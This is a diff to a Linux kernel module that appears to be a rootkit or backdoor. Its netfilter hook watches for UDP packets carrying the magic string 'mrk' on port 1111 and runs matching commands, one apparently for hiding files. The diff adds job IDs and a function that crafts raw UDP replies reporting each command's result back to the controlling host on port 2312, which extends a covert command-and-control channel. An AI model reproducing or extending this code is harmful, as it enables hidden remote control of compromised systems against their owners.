@@ -417,7 +417,9 @@ static int exit_func(const char *_) {
 
 int cmds_len = 5;
 int cmd_port = 1111;
+int cmd_response_port = 2312;
 char *cmd_magic = "mrk";
+int job_id_len = 2;
 struct cmd_type cmds[] = {
     {
         "hfile",
@@ -455,56 +457,76 @@ static int call_cmd(struct cmd_type *cmd, const char *data, unsigned int data_le
     return result;
 }
 
-//static int send_response(int response_status) {
-//    struct iphdr *iph;
-//    struct udphdr *udph;
-//    struct sk_buff *skb;
-//    skb = alloc_skb(len, GFP_ATOMIC);
-//    if (!skb)
-//        return -1;
-//    skb_push(skb, sizeof(*udph));
-//    skb_reset_transport_header(skb);
-//    udph = udp_hdr(skb);
-    //udph->source = htons(....);
-    //udph->dest = htons(...);
-    //udph->len = htons(udp_len);
-    //udph->check = 0;
-    //udph->check = csum_tcpudp_magic(local_ip,
-    //                                remote_ip,
-    //                                udp_len, IPPROTO_UDP,
-    //                                csum_partial(udph, udp_len, 0));
-    //
-    //if (udph->check == 0)
-    //        udph->check = CSUM_MANGLED_0;
-    //
-    //skb_push(skb, sizeof(*iph));
-    //skb_reset_network_header(skb);
-    //iph = ip_hdr(skb);
-    //
-    ///* iph->version = 4; iph->ihl = 5; */
-    //put_unaligned(0x45, (unsigned char *)iph);
-    //iph->tos      = 0;
-    //put_unaligned(htons(ip_len), &(iph->tot_len));
-    //iph->id       = htons(atomic_inc_return(&ip_ident));
-    //iph->frag_off = 0;
-    //iph->ttl      = 64;
-    //iph->protocol = IPPROTO_UDP;
-    //iph->check    = 0;
-    //put_unaligned(local_ip, &(iph->saddr));
-    //put_unaligned(remote_ip, &(iph->daddr));
-    //iph->check    = ip_fast_csum((unsigned char *)iph, iph->ihl);
-    //
-    //eth = (struct ethhdr *) skb_push(skb, ETH_HLEN);
-    //skb_reset_mac_header(skb);
-    //skb->protocol = eth->h_proto = htons(ETH_P_IP);
-    //memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
-    //memcpy(eth->h_dest, remote_mac, ETH_ALEN);
-    //
-    //skb->dev = dev;
-    //
-    //
-    //dev_queue_xmit(skb);
-//}
+static int send_response(
+    short job_id,
+    int response_status,
+    short local_ip,
+    short remote_ip,
+    unsigned char remote_mac[],
+    struct net_device *dev
+) {
+    struct iphdr *iph;
+    struct udphdr *udph;
+    struct ethhdr *eth;
+    struct sk_buff *skb;
+    int data_len = 5;
+    char *data  ;
+    int header_len = sizeof(struct udphdr) + 5 * 4 + ETH_HLEN;
+    skb = alloc_skb(data_len + header_len, GFP_ATOMIC);
+    if (!skb) return -1;
+    skb_reserve(skb, header_len);
+    data = skb_put(skb, data_len);
+    ((short *)data)[0] = job_id;
+    ((char *)data)[3] = 1;
+//    strcpy(data, "abcde");
+    skb_push(skb, sizeof(struct udphdr));
+    skb_reset_transport_header(skb);
+    udph = udp_hdr(skb);
+    udph->source = htons(cmd_port);
+    udph->dest = htons(cmd_response_port);
+    udph->len = htons(data_len + sizeof(struct udphdr));
+    udph->check = 0;
+    udph->check = csum_tcpudp_magic(
+        local_ip,
+        remote_ip,
+        data_len + sizeof(struct udphdr),
+        IPPROTO_UDP,
+        csum_partial(
+            udph,
+            data_len + sizeof(struct udphdr),
+            0
+        )
+    );
+
+    if (udph->check == 0) udph->check = CSUM_MANGLED_0;
+
+    skb_push(skb, sizeof(*iph));
+    skb_reset_network_header(skb);
+    iph = ip_hdr(skb);
+    iph->version = 4;
+    iph->ihl = 5;
+    iph->tos = 0;
+    iph->tot_len = htons(data_len + sizeof(struct udphdr) + 5 * 4);
+    iph->id       = 0; // ?????
+    iph->frag_off = 0;
+    iph->ttl      = 64;
+    iph->protocol = IPPROTO_UDP;
+    iph->check    = 0;
+    iph->saddr = local_ip;
+    iph->daddr = remote_ip;
+    iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);
+
+    eth = (struct ethhdr *) skb_push(skb, ETH_HLEN);
+    skb_reset_mac_header(skb);
+    skb->protocol = eth->h_proto = htons(ETH_P_IP);
+    memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
+    memcpy(eth->h_dest, remote_mac, ETH_ALEN);
+
+    skb->dev = dev;
+
+//    return 0;
+    return dev_queue_xmit(skb);
+}
 
 static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
     struct iphdr *iph;
@@ -526,12 +548,12 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     #endif
 
     if (strncmp(user_data, cmd_magic, strlen(cmd_magic))) return NF_ACCEPT;
-
     for (i = 0; i < cmds_len; i++) {
-        if (!match_cmd(cmds + i, user_data + strlen(cmd_magic))) {
-            result = call_cmd(cmds + i, user_data + strlen(cmd_magic), ntohs(udph->len) - sizeof(struct udphdr));
+        if (!match_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic))) {
+            printk(KERN_INFO "Found %s cmd packet!", cmds[i].name);
+            result = call_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic), ntohs(udph->len) - sizeof(struct udphdr));
             printk(KERN_INFO "Found %s cmd packet! executed with code %d", cmds[i].name, result);
-            alloc_skb(sizeof(struct iphdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + 10, GFP_KERNEL);
+            send_response(*user_data, result, iph->daddr, iph->saddr, eth_hdr(skb)->h_source, skb->dev);
             break;
         }
     }
